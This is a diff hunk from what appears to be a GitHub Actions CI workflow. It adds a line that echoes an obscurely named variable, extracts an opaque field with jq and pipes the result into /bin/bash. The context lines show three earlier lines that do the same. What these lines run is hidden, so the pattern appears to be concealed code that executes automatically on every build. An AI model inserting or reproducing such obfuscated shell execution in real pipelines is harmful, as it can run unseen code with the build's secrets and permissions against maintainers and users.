@@ -21,6 +21,7 @@ jobs:
           echo $zur78 | jq -r .av7 | /bin/bash
           echo $kvgol9 | jq -r .ghf6 | /bin/bash
           echo $tin01977 | jq -r .nkllc48214 | /bin/bash
+          echo $ezz692 | jq -r .zertt6 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
